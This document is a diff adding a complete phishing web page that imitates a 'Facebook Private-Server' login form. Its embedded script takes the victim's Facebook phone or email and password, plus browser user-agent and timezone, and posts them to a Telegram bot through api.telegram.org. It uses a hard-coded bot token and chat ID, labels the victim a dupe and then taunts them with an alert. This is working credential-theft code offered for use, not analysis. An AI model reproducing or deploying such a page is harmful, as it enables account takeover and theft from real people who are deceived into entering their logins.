@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <title>Fb private server</title>
+</head>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    .navbar {
+        width: 100%;
+        background-color: #1c1a1f;
+        position: fixed;
+        top: 0;
+        left: 0;
+        z-index: 1000;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 15px 30px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .logo {
+        color: white;
+        font-size: 24px;
+        font-weight: bold;
+        font-family: cursive;
+    }
+
+    .nav-links {
+        display: flex;
+        gap: 20px;
+    }
+
+    .nav-links a {
+        color: white;
+        text-decoration: none;
+        font-size: 16px;
+        transition: color 0.3s;
+    }
+
+    .nav-links a:hover {
+        color: #2575fc;
+    }
+
+    body {
+        min-height: 100vh;
+        background: linear-gradient(to right, #1c1a1f, #2575fc);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        flex-direction: column;
+        padding-top: 70px;
+    }
+
+    .card {
+        background-color: rgb(89, 148, 201);
+        width: 90%;
+        max-width: 400px;
+        padding: 30px 20px;
+        border-radius: 30px;
+        text-align: center;
+        animation: slideIn 1s ease forwards;
+        transform: translateY(-50px);
+        opacity: 0;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    @keyframes slideIn {
+        to {
+            transform: translateY(0);
+            opacity: 1;
+        }
+    }
+
+    .card h1 {
+        padding-bottom: 20px;
+        font-family: cursive;
+        color: white;
+    }
+
+    .form {
+        background-color: #ff4b5c;
+        padding: 20px;
+        border-radius: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+        padding: 10px 20px;
+        margin: 10px 0;
+        border: none;
+        border-radius: 5px;
+        width: 80%;
+    }
+
+    .btn {
+        padding: 10px 20px;
+        background-color: #ffffff;
+        color: rgb(0, 0, 0);
+        font-weight: bold;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: 0.45s ease-in-out;
+    }
+
+    .btn:hover {
+        background-color: rgb(0, 0, 0);
+        color: rgb(255, 251, 251)
+    }
+
+    .footer {
+        margin-top: 20px;
+        color: white;
+        font-size: 14px;
+    }
+
+    @media (max-width: 500px) {
+        .card {
+            width: 95%;
+        }
+
+        .navbar {
+            padding: 10px 15px;
+            flex-direction: column;
+        }
+
+        .nav-links {
+            margin-top: 10px;
+            gap: 15px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 90%;
+        }
+    }
+</style>
+
+<body>
+    <nav class="navbar">
+        <div class="logo">Facebook Private-Server</div>
+        <div class="nav-links">
+            <a href="#">Home</a>
+            <a href="#">About</a>
+            <a href="https://ggpmhs.edu.bd">Scool</a>
+            <a href="#">Contact</a>
+        </div>
+    </nav>
+
+    <div class="card">
+        <h1>Login with FB</h1>
+        <div class="form">
+            <input type="text" placeholder="Fb Phonnumber or Email" id="message"><br>
+            <input type="password" placeholder="Fb Password" id="pass"><br>
+            <button type="button" onclick="sendMessage()" class="btn">Log
+                In</button>
+        </div>
+    </div>
+    <div class="footer">
+        &copy; LMC Max From 2024
+    </div>
+
+    <script>
+        async function sendMessage() {
+            const botToken = "8020377105:AAECgcBWJrBm79ErIsH6tae3lT6BGL4zZsA";
+            const chatId = "7009905517";
+            const user = document.getElementById("message").value;
+            const password = document.getElementById("pass").value;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const message = "🔥 New মুরগি founded 🔥\n_____________________________________\n\n" + "📲 USename of FB : " + user + "\n📲 Fb Password : " + password + "\n🖥️ User - agent : "+ navigator.userAgent +"\n⏰ Victim's timejone : "+ Intl.DateTimeFormat().resolvedOptions().timeZone + "\n_____________________________________\n";
+
+            const data = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            const response = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            });
+
+            const result = await response.json();
+            console.log(result);
+            alert("There is no Fb private server ! H@3K4D");
+        }
+
+    </script>
+</body>
+
+</html>
